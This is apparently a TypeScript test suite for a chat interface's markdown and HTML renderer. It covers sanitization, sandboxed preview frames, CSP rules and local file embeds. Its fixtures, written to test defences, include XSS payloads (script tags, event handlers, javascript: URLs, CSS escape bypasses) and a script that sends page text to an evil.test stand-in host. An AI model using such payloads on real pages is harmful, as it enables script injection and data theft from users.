// Run: npx tsx packages/chat-ui/src/MarkdownBody.html.test.tsx

import React, { act } from "react";
import { isolateBlockDirectives } from "./blockDirectives";
import { createRoot, type Root } from "react-dom/client";
import { Window } from "happy-dom";

type TestFn = () => void | Promise<void>;

const tests: Array<[string, TestFn]> = [];
function test(name: string, fn: TestFn) {
  tests.push([name, fn]);
}

function assert(condition: unknown, message: string): asserts condition {
  if (!condition) throw new Error(message);
}

function setupDom() {
  (globalThis as { IS_REACT_ACT_ENVIRONMENT?: boolean }).IS_REACT_ACT_ENVIRONMENT = true;
  const window = new Window({ url: "http://localhost/" });
  Object.defineProperty(globalThis, "window", { value: window, configurable: true });
  Object.defineProperty(globalThis, "document", { value: window.document, configurable: true });
  Object.defineProperty(globalThis, "navigator", { value: window.navigator, configurable: true });
  Object.defineProperty(globalThis, "HTMLElement", { value: window.HTMLElement, configurable: true });
  Object.defineProperty(globalThis, "SVGElement", { value: window.SVGElement, configurable: true });
  Object.defineProperty(globalThis, "Element", { value: window.Element, configurable: true });
  Object.defineProperty(globalThis, "Node", { value: window.Node, configurable: true });
  window.matchMedia = () => ({
    matches: false,
    media: "",
    onchange: null,
    addEventListener: () => {},
    removeEventListener: () => {},
    addListener: () => {},
    removeListener: () => {},
    dispatchEvent: () => false,
  });
  return window;
}

async function render(ui: React.ReactElement): Promise<{ host: HTMLDivElement; root: Root }> {
  const host = document.createElement("div");
  document.body.appendChild(host);
  const root = createRoot(host);
  await act(async () => {
    root.render(ui);
  });
  return { host, root };
}

const testWindow = setupDom();

const { RichMarkdown } = await import("./MarkdownBody");
const { sanitizeStyleValue, containsHtmlMarkup, normalizeMultilineHtmlBlocks } = await import("./htmlSanitize");
const { buildHtmlPreviewDocument, parseHtmlFileDirective, sanitizeLocalHtml } = await import("./HtmlPreviewBlock");
const { configureHtmlFileLoader } = await import("./htmlFileLoader");
const { configureLocalArtifactLoader } = await import("./localArtifactLoader");
const { parseLocalArtifactDirective } = await import("./LocalArtifactBlock");

test("directive paths render through markdown, user and linked message bodies", async () => {
  const { renderUserContent } = await import("./MarkdownBody");
  const { LinkedText } = await import("./codeterm/LinkedText");
  const { LocalArtifactScope } = await import("./LocalArtifactScope");
  const path = "/work/a_b_c [preview].png";
  const calls: Array<[string, string | undefined]> = [];
  configureLocalArtifactLoader(async (file, _kind, tab) => {
    calls.push([file, tab]);
    return { data: "data:image/png;base64,aGVsbG8=", media_type: "image/png" };
  });
  const source = `Lead\n@ds-image ${path}\nTail`;
  for (const body of [<RichMarkdown text={source} />, renderUserContent(source), <LinkedText text={`pl_abcdef\n${source}`} onOpenPlan={() => {}} />]) {
    const { host, root } = await render(<LocalArtifactScope tabId="owner">{body}</LocalArtifactScope>);
    assert(host.querySelector("img")?.getAttribute("src") === "data:image/png;base64,aGVsbG8=", "loaded image is visible");
    assert(host.textContent?.includes("Lead") && host.textContent?.includes("Tail"), "prose is preserved");
    await act(async () => root.unmount());
    host.remove();
  }
  assert(calls.length === 3 && calls.every(([file, tab]) => file === path && tab === "owner"), "all bodies preserve path and owning tab");
  configureLocalArtifactLoader(null);
});

function paragraphLines(host: HTMLElement): string[] {
  const visibleText = (node: Node): string => {
    if (node.nodeName === "BR") return "\n";
    if (node.nodeType === 3) return (node.textContent ?? "").replace(/\r\n?/g, "\n");
    return Array.from(node.childNodes, visibleText).join("");
  };
  return Array.from(host.querySelectorAll("p"), visibleText);
}

test("mixed soft and hard verse breaks each render one newline", async () => {
  for (const ending of ["\n", "\r\n"]) {
    for (const sourcePositions of [false, true]) {
      const source = ["first  ", "second", "third\\", "fourth", "", "fifth  ", "sixth"].join(ending);
      const { host, root } = await render(<RichMarkdown text={source} sourcePositions={sourcePositions} />);
      try {
        assert(JSON.stringify(paragraphLines(host)) === JSON.stringify([
          "first\nsecond\nthird\nfourth", "fifth\nsixth",
        ]), `hard breaks must not add a second visible newline; ending=${JSON.stringify(ending)} sourcePositions=${sourcePositions} actual=${JSON.stringify(paragraphLines(host))}`);
      } finally {
        await act(async () => root.unmount());
        host.remove();
      }
    }
  }
});

test("arbitrary delta splits preserve verse blocks through completion", async () => {
  for (const ending of ["\n", "\r\n"]) {
    const source = ["first  ", "second", "third\\", "fourth", "", "fifth  ", "sixth"].join(ending);
    const { host: whole, root: wholeRoot } = await render(<RichMarkdown text={source} />);
    const { host, root } = await render(<RichMarkdown text="" />);
    try {
      for (let split = 0; split <= source.length; split += 1) {
        let accumulated = "";
        for (const delta of [source.slice(0, split), source.slice(split)]) {
          accumulated += delta;
          await act(async () => root.render(<RichMarkdown text={accumulated} />));
        }
        assert(host.innerHTML === whole.innerHTML, `split ${split} changes streamed blocks`);
        await act(async () => root.render(<RichMarkdown text={source} />));
        assert(host.innerHTML === whole.innerHTML, `completion changes blocks after split ${split}`);
      }
      let accumulated = "";
      for (const delta of source) {
        accumulated += delta;
        await act(async () => root.render(<RichMarkdown text={accumulated} />));
      }
      assert(host.innerHTML === whole.innerHTML, "one-character deltas change blocks");
    } finally {
      await act(async () => { root.unmount(); wholeRoot.unmount(); });
      host.remove();
      whole.remove();
    }
  }
});

test("hard break cleanup also runs alongside inline HTML", async () => {
  const { host, root } = await render(<RichMarkdown text={"first <em>verse</em>  \nsecond\nthird"} />);
  try {
    assert(paragraphLines(host)[0] === "first verse\nsecond\nthird", "HTML path doubles a hard break");
  } finally {
    await act(async () => root.unmount());
    host.remove();
  }
});

test("containsHtmlMarkup gates on real tags, not comparisons", () => {
  assert(containsHtmlMarkup("press <kbd>Ctrl</kbd>"), "opening tag detected");
  assert(containsHtmlMarkup("</div>"), "closing tag detected");
  assert(!containsHtmlMarkup("a < b and c > d"), "bare comparison is not markup");
  assert(!containsHtmlMarkup("2 <3"), "numeric comparison is not markup");
});

test("sanitizeStyleValue keeps cosmetics and drops escape hatches", () => {
  assert(sanitizeStyleValue("color: red; font-weight: bold") === "color: red; font-weight: bold;", "cosmetic declarations survive");
  assert(sanitizeStyleValue("color: color-mix(in srgb, red 40%, blue)") === "color: color-mix(in srgb, red 40%, blue);", "color functions survive");
  assert(sanitizeStyleValue("position: fixed; top: 0") === null, "position and offsets are not allowlisted");
  assert(sanitizeStyleValue("background: url(https://evil.test/x.png)") === null, "url() is stripped");
  assert(sanitizeStyleValue("behavior: url(#x)") === null, "behavior is stripped");
  assert(sanitizeStyleValue("color: expression(alert(1))") === null, "expression() is stripped");
  assert(sanitizeStyleValue("transform: translate(0,-400px)") === null, "transform is not allowlisted");
});

test("sanitizeStyleValue resists comment and escape bypasses", () => {
  assert(sanitizeStyleValue("position/**/: fixed") === null, "comment between name and colon does not smuggle position");
  assert(sanitizeStyleValue("/*x*/color: red") === "color: red;", "leading comment does not break a legit declaration");
  assert(sanitizeStyleValue("\\70 osition: fixed") === null, "css escape in the property name is rejected");
  assert(sanitizeStyleValue("background: \\75 rl(//evil.test)") === null, "css escape in the value is rejected");
  assert(sanitizeStyleValue("color: red; z-index: 9999") === "color: red;", "unlisted property drops, listed one survives");
});

test("inline HTML renders as elements", async () => {
  const { host } = await render(<RichMarkdown text={"press <kbd>Ctrl</kbd> and <mark>read this</mark>"} />);
  assert(host.querySelector("kbd")?.textContent === "Ctrl", "kbd element rendered");
  assert(host.querySelector("mark")?.textContent === "read this", "mark element rendered");
});

test("details/summary renders as a disclosure", async () => {
  const { host } = await render(<RichMarkdown text={"<details><summary>More</summary><p>Hidden</p></details>"} />);
  assert(host.querySelector("details"), "details element rendered");
  assert(host.querySelector("summary")?.textContent === "More", "summary text rendered");
});

test("blank lines inside a multiline HTML visualization stay inside the HTML block", async () => {
  const text = [
    "Before the map",
    "",
    '<div style="display: flex">',
    "",
    '  <div style="padding: 12px">Root</div>',
    "",
    "  <div>",
    '    <div style="border: 1px solid green">Working</div>',
    "",
    '    <div style="border: 1px solid red">Failed</div>',
    "  </div>",
    "",
    "</div>",
  ].join("\n");
  const normalized = normalizeMultilineHtmlBlocks(text);
  assert(!normalized.slice(normalized.indexOf("<div")).includes("\n\n"), "blank lines inside the root HTML block are removed");
  const { host } = await render(<RichMarkdown text={text} />);
  assert(host.textContent?.includes("Before the map"), "markdown before the visualization survives");
  assert(host.textContent?.includes("Root"), "root node renders");
  assert(host.textContent?.includes("Working"), "working child renders");
  assert(host.textContent?.includes("Failed"), "failed child renders");
  assert(!host.querySelector("[data-testid='chat-plain-code-block']"), "nested HTML never becomes a markdown code block");
});

test("script tags and event handlers are stripped", async () => {
  const { host } = await render(
    <RichMarkdown text={"<div onclick=\"alert(1)\">hi</div><script>alert(2)</script><img src=x onerror=\"alert(3)\">"} />,
  );
  assert(!host.querySelector("script"), "script element must not render");
  const div = host.querySelector("div[onclick]");
  assert(!div, "inline event handler attribute must be stripped");
  assert(!host.innerHTML.includes("onerror"), "img onerror must be stripped");
  assert(host.textContent?.includes("hi"), "safe content still renders");
});

test("nested HTML cards render static inline SVG geometry", async () => {
  const fixture = [
    '<div style="display: flex; gap: 12px">',
    '  <div style="background: #20242c; padding: 12px; border-radius: 8px">',
    '    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">',
    '      <path d="M12 2v20M2 12h20"></path>',
    "    </svg>",
    "  </div>",
    "</div>",
  ].join("\n");
  const { host } = await render(<RichMarkdown text={fixture} />);
  const svg = host.querySelector("div > div > svg");
  const path = svg?.querySelector("path");
  assert(svg, "SVG survives inside the screenshot-shaped nested card");
  assert(path?.getAttribute("d") === "M12 2v20M2 12h20", "static path geometry survives sanitization");
  assert(svg.getAttribute("viewBox") === "0 0 24 24", "SVG viewport survives sanitization");
  assert(svg.getAttribute("stroke") === "currentColor", "safe local paint survives sanitization");
  assert(!svg.hasAttribute("xmlns"), "namespace declarations are not retained");
});

test("hostile SVG capabilities and external paint are stripped", async () => {
  const hostile = [
    '<svg viewBox="0 0 24 24" xmlns:xlink="http://www.w3.org/1999/xlink" onclick="steal()">',
    '  <script>steal()</script>',
    '  <foreignObject><div>foreign</div></foreignObject>',
    '  <animate attributeName="fill" values="red;blue"></animate>',
    '  <image href="https://evil.test/pixel.svg"></image>',
    '  <use xlink:href="https://evil.test/icons.svg#x"></use>',
    '  <path d="M2 2h20v20H2z" fill="url(https://evil.test/paint.svg#x)" stroke="javascript:steal()"></path>',
    "</svg>",
  ].join("\n");
  const { host } = await render(<RichMarkdown text={hostile} />);
  const svg = host.querySelector("svg");
  const path = svg?.querySelector("path");
  assert(svg && path, "safe static SVG shell and geometry remain visible");
  assert(!host.querySelector("script, foreignObject, animate, image, use"), "active, foreign, animated, and loading SVG tags are blocked");
  assert(!svg.hasAttribute("onclick") && !svg.hasAttribute("xmlns:xlink"), "handlers and unsafe namespaces are blocked");
  assert(!path.hasAttribute("fill") && !path.hasAttribute("stroke"), "URL and script-like paint values are blocked");
  assert(!host.innerHTML.includes("evil.test") && !host.innerHTML.includes("javascript:"), "external URLs do not survive");
});

test("iframe and object tags are stripped from inline HTML", async () => {
  const { host } = await render(<RichMarkdown text={"<iframe src=\"https://evil.test\"></iframe><object data=\"x\"></object>"} />);
  assert(!host.querySelector("iframe"), "inline iframe must not render");
  assert(!host.querySelector("object"), "inline object must not render");
});

test("dangerous inline style declarations are scrubbed but safe ones survive", async () => {
  const { host } = await render(
    <RichMarkdown text={"<span style=\"color: tomato; position: fixed; top: 0\">tinted</span>"} />,
  );
  const span = host.querySelector("span[style]");
  assert(span, "styled span rendered");
  const style = span!.getAttribute("style") ?? "";
  assert(/tomato/.test(style), "color survives");
  assert(!/position/.test(style), "position is scrubbed");
});

test("html code fence renders a locked-down sandboxed frame", async () => {
  const fencedSource = "<div>\n\n  <b>hello</b>\n</div>";
  const { host } = await render(<RichMarkdown text={`\`\`\`html\n${fencedSource}\n\`\`\``} />);
  const frame = host.querySelector("iframe[data-testid='chat-html-preview-frame']");
  assert(frame, "preview iframe rendered for an html fence");
  assert(frame!.getAttribute("sandbox") === "allow-scripts", "sandbox must be allow-scripts only");
  const srcdoc = frame!.getAttribute("srcdoc") ?? "";
  assert(srcdoc.includes(fencedSource), "fence source and its blank lines are embedded verbatim");
  assert(srcdoc.includes("Content-Security-Policy"), "CSP meta is embedded");
});

test("file-backed HTML fence loads and sanitizes its single source", async () => {
  const path = "C:\\Users\\dev\\Desktop\\design-system.html";
  let reads = 0;
  configureHtmlFileLoader(async (requested) => {
    reads += 1;
    assert(requested === path, "loader receives the exact absolute path");
    return "<main class='p-4'>From file</main><script>steal()</script>";
  });
  assert(parseHtmlFileDirective(`@file "${path}"`) === path, "quoted file directive parses");
  const { host } = await render(<RichMarkdown text={`\`\`\`html\n@file ${path}\n\`\`\``} />);
  await act(async () => {
    await Promise.resolve();
  });
  const frame = host.querySelector("iframe[data-testid='chat-html-preview-frame']");
  assert(frame, "file-backed preview iframe rendered");
  const srcdoc = frame.getAttribute("srcdoc") ?? "";
  assert(srcdoc.includes("From file"), "loaded file is the rendered source");
  assert(!srcdoc.includes("steal()"), "file scripts are removed before rendering");
  assert(host.textContent?.includes("Local file"), "file provenance is visible");
  assert(reads === 1, "file is loaded once on mount");
  configureHtmlFileLoader(null);
});

test("standalone ct artifact directives render pages, images, and documents", async () => {
  const pagePath = "C:\\Users\\dev\\Desktop\\view.html";
  const imagePath = "C:\\Users\\dev\\Desktop\\preview.png";
  const documentPath = "C:\\Users\\dev\\Desktop\\notes.md";
  configureHtmlFileLoader(async (path) => {
    assert(path === pagePath, "ds-page uses the existing sandboxed page loader");
    return "<main>Page from file</main>";
  });
  configureLocalArtifactLoader(async (path, kind) => {
    if (kind === "image") {
      assert(path === imagePath, "ds-image preserves its absolute path");
      return { data: "data:image/png;base64,AA==", media_type: "image/png" };
    }
    assert(path === documentPath && kind === "document", "ds-document preserves kind and path");
    return {
      data: "# Document title\n\n![tracker](https://example.test/pixel.png)",
      media_type: "text/markdown",
    };
  });

  assert(parseLocalArtifactDirective(`@ds-page "${pagePath}"`)?.path === pagePath, "quoted ds-page parses");
  assert(parseLocalArtifactDirective(`@ct-image ${imagePath}`)?.kind === "image", "legacy ct-image parses");
  {
    const { host: legacy } = await render(
      <RichMarkdown text={isolateBlockDirectives(`@ct-page ${pagePath}\n@ct-image ${imagePath}\n@ct-document ${documentPath}`)} />,
    );
    await act(async () => {
      await Promise.resolve();
      await Promise.resolve();
    });
    assert(legacy.querySelector("iframe")?.getAttribute("srcdoc")?.includes("Page from file"), "consecutive legacy ct-page renders in the HTML sandbox");
    assert(legacy.querySelector('[data-testid="chat-ds-image"]'), "consecutive legacy ct-image renders an image block");
    assert(legacy.querySelector('[data-testid="chat-ds-document"]'), "consecutive legacy ct-document renders a document block");
  }
  const { host } = await render(
    <RichMarkdown text={`@ds-page ${pagePath}\n\n@ds-image ${imagePath}\n\n@ds-document ${documentPath}`} />,
  );
  await act(async () => {
    await Promise.resolve();
    await Promise.resolve();
  });
  assert(host.querySelector("iframe")?.getAttribute("srcdoc")?.includes("Page from file"), "ds-page renders in the HTML sandbox");
  assert(host.querySelector<HTMLImageElement>("[data-testid='chat-ds-image'] img")?.src.startsWith("data:image/png"), "ds-image renders bounded data");
  assert(host.querySelector("[data-testid='chat-ds-document'] h1")?.textContent === "Document title", "Markdown document renders as a document");
  assert(!host.querySelector("[data-testid='chat-ds-document'] img"), "document Markdown cannot fetch external images");
  assert(host.textContent?.includes("external image omitted"), "blocked document media is explicit");

  configureHtmlFileLoader(null);
  configureLocalArtifactLoader(null);
});

test("local embeds retain DOM and scroll across focus, visibility, and identical transcript resync", async () => {
  let pageReads = 0;
  let artifactReads = 0;
  configureHtmlFileLoader(async () => {
    pageReads += 1;
    return "<main>Original page</main>";
  });
  configureLocalArtifactLoader(async (_path, kind) => {
    artifactReads += 1;
    return kind === "image"
      ? { data: "data:image/png;base64,AA==", media_type: "image/png" }
      : { data: "# Original document\n\n" + "Scrollable content\n\n".repeat(2200), media_type: "text/markdown" };
  });
  const snapshot = () => [
    { id: "page", text: "@ds-page C:/preview.html" },
    { id: "image", text: "@ds-image C:/preview.png" },
    { id: "document", text: "@ds-document C:/preview.md" },
  ];
  const transcript = (messages: ReturnType<typeof snapshot>) => (
    <>{messages.map((message) => <RichMarkdown key={message.id} text={message.text} />)}</>
  );
  const { host, root } = await render(transcript(snapshot()));
  try {
    const frame = host.querySelector("iframe");
    const image = host.querySelector("img");
    const documentHeading = host.querySelector("h1");
    const scroll = documentHeading?.parentElement;
    assert(frame && image && scroll, "all three embeds must be loaded");
    scroll.scrollTop = 420;
    for (const event of ["focus", "visibilitychange", "resync"]) {
      await act(async () => {
        if (event === "focus") window.dispatchEvent(new testWindow.Event(event));
        if (event === "visibilitychange") document.dispatchEvent(new testWindow.Event(event));
        root.render(transcript(snapshot()));
      });
      assert(host.querySelector("iframe") === frame, `${event} preserves page identity`);
      assert(host.querySelector("img") === image, `${event} preserves image identity`);
      assert(host.querySelector("h1") === documentHeading, `${event} preserves document identity`);
      assert(scroll.isConnected && scroll.scrollTop === 420, `${event} preserves internal document scroll`);
      assert(pageReads === 1 && artifactReads === 2, `${event} must not refetch files`);
    }

    configureHtmlFileLoader(async () => "<main>Changed page</main>");
    configureLocalArtifactLoader(async (_path, kind) => kind === "image"
      ? { data: "data:image/png;base64,AQ==", media_type: "image/png" }
      : { data: "# Changed document", media_type: "text/markdown" });
    const reloads = Array.from(host.querySelectorAll<HTMLButtonElement>("button"))
      .filter((button) => button.getAttribute("aria-label")?.startsWith("Reload ") || button.textContent === "Reload");
    assert(reloads.length === 3, "each file preview exposes a reload control");
    await act(async () => {
      reloads.forEach((button) => button.dispatchEvent(new testWindow.MouseEvent("click", { bubbles: true })));
    });
    assert(host.querySelector("iframe")?.getAttribute("srcdoc")?.includes("Changed page"), "reload renders changed page");
    assert(host.querySelector("img")?.getAttribute("src") === "data:image/png;base64,AQ==", "reload renders changed image");
    assert(host.querySelector("h1")?.textContent === "Changed document", "reload renders changed document");
  } finally {
    await act(async () => root.unmount());
    host.remove();
    configureHtmlFileLoader(null);
    configureLocalArtifactLoader(null);
  }
});

test("standalone ct directives preserve Windows and forward-slash paths", async () => {
  const windowsPath = "C:\\Users\\dev\\.codex\\generated_images\\windows.png";
  const forwardPath = "C:/Users/dev/.codex/generated_images/forward.png";
  const requested: string[] = [];
  configureLocalArtifactLoader(async (path, kind) => {
    assert(kind === "image", "path compatibility fixture should remain an image directive");
    requested.push(path);
    return { data: "data:image/png;base64,AA==", media_type: "image/png" };
  });

  const { host } = await render(
    <RichMarkdown text={`@ds-image ${windowsPath}\n\n@ds-image ${forwardPath}`} />,
  );
  await act(async () => {
    await Promise.resolve();
    await Promise.resolve();
  });

  assert(requested[0] === windowsPath, "Markdown must not consume backslashes before punctuation");
  assert(requested[1] === forwardPath, "forward-slash paths should remain unchanged");
  assert(host.querySelectorAll("[data-testid='chat-ds-image'] img").length === 2, "both path forms should render");
  configureLocalArtifactLoader(null);
});

test("ct directives inside code fences remain inert code", async () => {
  const { host } = await render(<RichMarkdown text={"```text\n@ds-image C:\\\\secret.png\n```"} />);
  assert(!host.querySelector("[data-testid='chat-ds-image']"), "code-fenced directive is not executed");
  assert(host.textContent?.includes("@ds-image"), "literal directive remains visible");
});

test("html fullscreen survives a markdown parent rerender", async () => {
  const text = "```html\n<b>stable fullscreen</b>\n```";
  const { host, root } = await render(<RichMarkdown text={text} fontScale={1} />);
  const openButton = host.querySelector<HTMLButtonElement>("button[title='Open in fullscreen']");
  assert(openButton, "fullscreen button rendered");
  await act(async () => {
    openButton.dispatchEvent(new testWindow.MouseEvent("click", { bubbles: true }));
  });
  assert(host.querySelector("button[title='Close fullscreen']"), "fullscreen opened");

  await act(async () => {
    root.render(<RichMarkdown text={text} fontScale={1.25} />);
  });
  assert(host.querySelector("button[title='Close fullscreen']"), "fullscreen survives a parent rerender");
});

test("html fullscreen follows its scroll host bounds after resize", async () => {
  const rect = { top: 10, left: 20, width: 320, height: 240 };
  const { host } = await render(
    <div data-testid="scroll-host" style={{ overflowY: "auto" }}>
      <RichMarkdown text={"```html\n<b>responsive fullscreen</b>\n```"} />
    </div>,
  );
  const scrollHost = host.querySelector<HTMLElement>("[data-testid='scroll-host']");
  assert(scrollHost, "scroll host rendered");
  scrollHost.getBoundingClientRect = () => ({
    ...rect,
    right: rect.left + rect.width,
    bottom: rect.top + rect.height,
    x: rect.left,
    y: rect.top,
    toJSON: () => ({ ...rect }),
  } as DOMRect);
  const openButton = host.querySelector<HTMLButtonElement>("button[title='Open in fullscreen']");
  assert(openButton, "fullscreen button rendered");
  await act(async () => {
    openButton.dispatchEvent(new testWindow.MouseEvent("click", { bubbles: true }));
  });
  const fullscreen = host.querySelector<HTMLElement>("button[title='Close fullscreen']")?.closest<HTMLElement>(".fixed");
  assert(fullscreen?.style.width === "320px", "fullscreen starts at the scroll host width");

  rect.width = 640;
  rect.height = 480;
  await act(async () => {
    testWindow.dispatchEvent(new testWindow.Event("resize"));
  });
  assert(fullscreen.style.width === "640px", "fullscreen width follows the resized host");
  assert(fullscreen.style.height === "480px", "fullscreen height follows the resized host");
});

test("preview document CSP blocks network egress", () => {
  const doc = buildHtmlPreviewDocument("<b class=\"animate-pulse\">x</b>", {
    bg: "#000",
    fg: "#fff",
    accent: "#08f",
    muted: "#888",
    border: "#333",
  }, "window.__tailwindRuntimeLoaded = true;");
  assert(doc.includes("connect-src 'none'"), "connect-src is none");
  assert(doc.includes("default-src 'none'"), "default-src is none");
  assert(doc.includes("form-action 'none'"), "form-action is none");
  assert(!doc.includes("allow-same-origin"), "document never opts into same-origin");
  assert(doc.includes("window.__tailwindRuntimeLoaded = true"), "bundled Tailwind runtime is inline");
  assert(doc.includes("window.ct=Object.freeze"), "self-describing ct runtime is inline");
  assert(doc.includes("ct.file.pick(options)"), "user-picked file capability is documented");
  assert(doc.includes("ct.file.renderHtml(options)"), "sanitized local HTML capability is documented");
  assert(!doc.includes("<script src="), "preview loads no network scripts");
});

test("local HTML sanitization removes active and external content", () => {
  const result = sanitizeLocalHtml(`<!doctype html><html><head>
    <meta http-equiv="refresh" content="0;url=https://evil.test">
    <style>.safe{color:red}</style><style>.leak{background:url(https://evil.test/x)}</style>
    <script>location='https://evil.test/'+document.body.innerText</script>
  </head><body onload="steal()"><form action="https://evil.test"><button>Keep label</button></form>
    <a href="https://evil.test" onclick="steal()">Safe text</a>
    <img src="https://evil.test/pixel"><img src="data:image/png;base64,AA==">
    <iframe src="https://evil.test"></iframe>
  </body></html>`);
  assert(!result.html.includes("evil.test"), "external destinations are removed");
  assert(!result.html.includes("<script"), "scripts are removed");
  assert(!result.html.includes("<form"), "forms are unwrapped");
  assert(!result.html.includes("onload") && !result.html.includes("onclick"), "event handlers are removed");
  assert(result.html.includes("Keep label") && result.html.includes("Safe text"), "safe content remains");
  assert(result.html.includes("data:image/png;base64,AA=="), "embedded raster image remains");
  assert(result.removed >= 8, "sanitizer reports removed active content");
});

test("non-html fences still render as code, not previews", async () => {
  const { host } = await render(<RichMarkdown text={"```ts\nconst a = 1;\n```"} />);
  assert(!host.querySelector("iframe"), "ts fence must not produce an iframe");
  assert(host.querySelector("[data-testid='chat-code-block']"), "ts fence renders a code block");
});

let failures = 0;
for (const [name, fn] of tests) {
  try {
    await fn();
    console.log(`  ✓ ${name}`);
  } catch (error) {
    failures += 1;
    console.error(`  ✗ ${name}: ${(error as Error).message}`);
  }
}
if (failures > 0) {
  console.error(`${failures} of ${tests.length} tests failed`);
  process.exit(1);
}
console.log(`✓ ${tests.length} tests passed`);
